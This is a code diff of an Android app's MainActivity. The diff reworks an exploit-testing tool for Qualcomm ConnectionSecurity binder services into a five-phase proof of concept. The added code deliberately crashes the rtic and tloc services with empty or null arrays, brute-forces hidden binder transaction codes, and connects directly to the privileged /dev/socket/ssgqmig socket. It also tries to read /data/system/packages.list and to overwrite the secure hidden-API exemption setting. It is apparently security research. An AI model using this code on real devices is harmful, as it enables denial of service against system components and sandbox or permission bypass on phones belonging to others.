@@ -5,13 +5,18 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
+import android.net.LocalSocket;
+import android.net.LocalSocketAddress;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.Parcel;
+import android.os.ParcelFileDescriptor;
 import android.os.RemoteException;
+import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
@@ -25,13 +30,18 @@ import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
 import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
 
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.lang.reflect.Method;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
 
@@ -106,11 +116,14 @@ public class MainActivity extends AppCompatActivity {
                 android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                 android.Manifest.permission.ACCESS_FINE_LOCATION
         };
+        List<String> toRequest = new ArrayList<>();
         for (String p : perms) {
             if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this, perms, 100);
-                break;
+                toRequest.add(p);
             }
+        }
+        if (!toRequest.isEmpty()) {
+            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
         }
     }
 
@@ -144,24 +157,31 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeFullTest() {
         isTesting.set(true);
-        appendLog("========== ConnectionSecurity Advanced Exploit Test ==========");
-
-        // 既知のサービス取得（rtic, tloc）
+        appendLog("========== PHASE 1: Service Enumeration & Crash ==========");
         IBinder rticBinder = getService("rtic");
         IBinder tlocBinder = getService("tloc");
 
         if (rticBinder != null) {
             IRticService rtic = IRticService.Stub.asInterface(rticBinder);
-            testRtic(rtic);
-            // さらに transact で未公開メソッドを探索
-            discoverMethods(rticBinder, "IRticService");
+            crashRtic(rtic);
         }
-
         if (tlocBinder != null) {
             ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
-            testTloc(tloc);
-            discoverMethods(tlocBinder, "ITlocService");
+            crashTloc(tloc);
         }
+
+        appendLog("========== PHASE 2: Hidden Method Discovery ==========");
+        if (rticBinder != null) discoverMethods(rticBinder, "IRticService");
+        if (tlocBinder != null) discoverMethods(tlocBinder, "ITlocService");
+
+        appendLog("========== PHASE 3: Direct Socket to ssgqmig ==========");
+        tryConnectToSsgqmig();
+
+        appendLog("========== PHASE 4: File Read/Write Tests ==========");
+        testFileReadWrite();
+
+        appendLog("========== PHASE 5: Settings Manipulation ==========");
+        testSettingsWrite();
 
         appendLog("========== ALL TESTS COMPLETED ==========");
         updateStatus("Done");
@@ -188,79 +208,79 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testRtic(IRticService rtic) {
-        appendLog("--- Testing IRticService with fuzzing ---");
-        long[] timestamps = {
-            0,
-            -1,
-            Long.MIN_VALUE,
-            Long.MAX_VALUE,
-            123456789L,
-            System.currentTimeMillis(),
-            0xFFFFFFFFL,
-            0x100000000L,
-            0x7FFFFFFFFFFFFFFFL,
-            0x8000000000000000L
+    private void crashRtic(IRticService rtic) {
+        appendLog("--- Causing RticService crashes ---");
+        // 空の配列で呼び出し -> ArrayIndexOutOfBoundsException
+        int[][] emptyArrays = {
+            new int[0],
+            new int[0],
+            null // null might cause NPE
         };
-        boolean[] bools = {false, true};
-        for (long ts : timestamps) {
-            if (stopRequested.get()) break;
-            for (boolean z : bools) {
-                try {
-                    int[] status = new int[1];
-                    int[] ret = new int[1];
-                    byte[] data = rtic.getRticData(ts, status, ret, z);
-                    appendLog("TS=" + ts + ", z=" + z + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
-                    if (data != null && data.length > 0) {
-                        String hex = bytesToHex(data, 100);
-                        appendLog("  Data(hex): " + hex);
-                        try {
-                            String str = new String(data, StandardCharsets.UTF_8);
-                            appendLog("  Data(UTF-8): " + str);
-                        } catch (Exception e) {}
-                    }
-                } catch (RemoteException e) {
-                    appendLog("RemoteException: " + e.getMessage());
-                } catch (Exception e) {
-                    appendLog("Exception: " + e.toString());
-                }
+        for (int i = 0; i < emptyArrays.length; i++) {
+            try {
+                int[] status = emptyArrays[i] == null ? null : new int[emptyArrays[i].length];
+                int[] ret = emptyArrays[i] == null ? null : new int[emptyArrays[i].length];
+                appendLog("  Calling with array " + (i+1) + " (len=" + (emptyArrays[i] == null ? "null" : emptyArrays[i].length) + ")");
+                rtic.getRticData(0, status, ret, false);
+                appendLog("  No crash? status=" + (status != null ? status[0] : "null"));
+            } catch (RemoteException e) {
+                appendLog("  RemoteException: " + e.getMessage());
+            } catch (Exception e) {
+                appendLog("  Exception: " + e.getClass().getSimpleName() + " - " + e.getMessage());
             }
+            try { Thread.sleep(100); } catch (Exception ignored) {}
         }
-        // 巨大なバイト配列を引数で渡せないので、代わりに null を渡すテスト
-        // 本来は getRticData に byte[] を渡すオーバーロードはないが、リフレクションで可能か?
-    }
-
-    private void testTloc(ITlocService tloc) {
-        appendLog("--- Testing ITlocService ---");
+        // 巨大なタイムスタンプでも試す
         try {
             int[] status = new int[1];
             int[] ret = new int[1];
-            byte[] data = tloc.getTrustedLocation(status, ret);
-            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
-            if (data != null && data.length > 0) {
-                String str = new String(data, StandardCharsets.UTF_8);
-                appendLog("Data: " + str);
-            }
-            int warmup = tloc.tlocWarmUp();
-            appendLog("tlocWarmUp returned: " + warmup);
-        } catch (RemoteException e) {
-            appendLog("RemoteException: " + e.getMessage());
+            rtic.getRticData(Long.MAX_VALUE, status, ret, false);
+            appendLog("  MAX_VALUE no crash");
+        } catch (Exception e) {
+            appendLog("  MAX_VALUE crash: " + e.getMessage());
+        }
+    }
+
+    private void crashTloc(ITlocService tloc) {
+        appendLog("--- Causing TlocService crashes ---");
+        try {
+            int[] status = new int[0];
+            int[] ret = new int[0];
+            tloc.getTrustedLocation(status, ret);
+            appendLog("  No crash with empty arrays?");
+        } catch (Exception e) {
+            appendLog("  getTrustedLocation crash: " + e.getMessage());
+        }
+        try {
+            int[] status = null;
+            int[] ret = null;
+            tloc.getTrustedLocation(status, ret);
+            appendLog("  No crash with null?");
+        } catch (Exception e) {
+            appendLog("  getTrustedLocation with null crash: " + e.getMessage());
+        }
+        // 異常な配列長
+        try {
+            int[] status = new int[2];
+            int[] ret = new int[2];
+            tloc.getTrustedLocation(status, ret);
+            appendLog("  No crash with len=2?");
+        } catch (Exception e) {
+            appendLog("  getTrustedLocation len=2 crash: " + e.getMessage());
         }
     }
 
     private void discoverMethods(IBinder binder, String serviceName) {
-        appendLog("--- Discovering hidden methods for " + serviceName + " via transact ---");
+        appendLog("--- Discovering hidden methods for " + serviceName + " ---");
         for (int code = 1; code <= 30; code++) {
             if (stopRequested.get()) break;
             Parcel data = Parcel.obtain();
             Parcel reply = Parcel.obtain();
             try {
-                // 簡易的なデータを入れてみる
                 data.writeInterfaceToken(binder.getInterfaceDescriptor());
                 boolean success = binder.transact(code, data, reply, 0);
                 if (success) {
-                    appendLog("Method code " + code + " succeeded, reply size=" + reply.dataSize());
-                    // 読み取りを試みる
+                    appendLog("Method " + code + " succeeded, reply size=" + reply.dataSize());
                     reply.setDataPosition(0);
                     try {
                         int result = reply.readInt();
@@ -275,10 +295,10 @@ public class MainActivity extends AppCompatActivity {
                         appendLog("  byte[] length: " + (b != null ? b.length : 0));
                     } catch (Exception e) {}
                 } else {
-                    appendLog("Method code " + code + " failed (security exception)");
+                    appendLog("Method " + code + " failed");
                 }
             } catch (Exception e) {
-                appendLog("Method code " + code + " threw: " + e.getClass().getSimpleName());
+                appendLog("Method " + code + " threw: " + e.getClass().getSimpleName());
             } finally {
                 data.recycle();
                 reply.recycle();
@@ -286,14 +306,100 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private String bytesToHex(byte[] bytes, int max) {
-        StringBuilder sb = new StringBuilder();
-        int limit = Math.min(bytes.length, max);
-        for (int i = 0; i < limit; i++) {
-            sb.append(String.format("%02x", bytes[i] & 0xFF));
+    private void tryConnectToSsgqmig() {
+        appendLog("--- Trying to connect to /dev/socket/ssgqmig directly ---");
+        LocalSocket socket = null;
+        try {
+            socket = new LocalSocket();
+            socket.connect(new LocalSocketAddress("/dev/socket/ssgqmig", LocalSocketAddress.Namespace.FILESYSTEM));
+            appendLog("Connected to ssgqmig!");
+            OutputStream os = socket.getOutputStream();
+            InputStream is = socket.getInputStream();
+            // Send some simple QMI-like data? Not sure, just test connectivity.
+            os.write("HELLO".getBytes(StandardCharsets.UTF_8));
+            os.flush();
+            byte[] buf = new byte[1024];
+            int len = is.read(buf, 0, 1000);
+            appendLog("Response length: " + len);
+            socket.close();
+        } catch (Exception e) {
+            appendLog("Failed to connect to ssgqmig: " + e.getMessage());
+            if (socket != null) try { socket.close(); } catch (Exception ignored) {}
         }
-        if (bytes.length > max) sb.append("...");
-        return sb.toString();
+    }
+
+    private void testFileReadWrite() {
+        appendLog("--- Testing file read/write permissions ---");
+        File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+        if (!downloadDir.exists() && !downloadDir.mkdirs()) {
+            appendLog("Cannot create Download dir");
+            return;
+        }
+        // Write test
+        try {
+            File testFile = new File(downloadDir, "poc_write_test.txt");
+            try (FileOutputStream fos = new FileOutputStream(testFile)) {
+                fos.write("PoC write test\n".getBytes(StandardCharsets.UTF_8));
+            }
+            appendLog("Write to /sdcard/Download/poc_write_test.txt succeeded");
+        } catch (Exception e) {
+            appendLog("Write failed: " + e.getMessage());
+        }
+        // Read test (try to read /proc/version which is world-readable)
+        try {
+            File procVersion = new File("/proc/version");
+            if (procVersion.exists() && procVersion.canRead()) {
+                try (FileInputStream fis = new FileInputStream(procVersion)) {
+                    byte[] data = new byte[1024];
+                    int len = fis.read(data);
+                    if (len > 0) {
+                        String content = new String(data, 0, len, StandardCharsets.UTF_8);
+                        appendLog("Read /proc/version: " + content.trim());
+                    }
+                }
+            } else {
+                appendLog("/proc/version not readable or not exists");
+            }
+        } catch (Exception e) {
+            appendLog("Read /proc/version failed: " + e.getMessage());
+        }
+        // Try to read /data/system/packages.list (should be permission denied)
+        try {
+            File packagesList = new File("/data/system/packages.list");
+            if (packagesList.exists()) {
+                try (FileInputStream fis = new FileInputStream(packagesList)) {
+                    byte[] data = new byte[1024];
+                    int len = fis.read(data);
+                    if (len > 0) {
+                        String content = new String(data, 0, len, StandardCharsets.UTF_8);
+                        appendLog("Read /data/system/packages.list (should fail): " + content.trim());
+                    }
+                }
+            } else {
+                appendLog("/data/system/packages.list not exists");
+            }
+        } catch (Exception e) {
+            appendLog("Read /data/system/packages.list failed: " + e.getMessage());
+        }
+    }
+
+    private void testSettingsWrite() {
+        appendLog("--- Testing Settings write (WRITE_SECURE_SETTINGS) ---");
+        try {
+            String current = Settings.Global.getString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS);
+            appendLog("Current hidden_api_blacklist_exemptions: " + current);
+            // Try to write a test value (requires WRITE_SECURE_SETTINGS)
+            boolean success = Settings.Global.putString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, "test_value");
+            if (success) {
+                appendLog("WRITE_SECURE_SETTINGS succeeded! We can modify system settings.");
+                // Clean up
+                Settings.Global.putString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, current);
+            } else {
+                appendLog("WRITE_SECURE_SETTINGS failed (permission denied)");
+            }
+        } catch (Exception e) {
+            appendLog("Settings write error: " + e.getMessage());
+        }
     }
 
     private void appendLog(final String msg) {
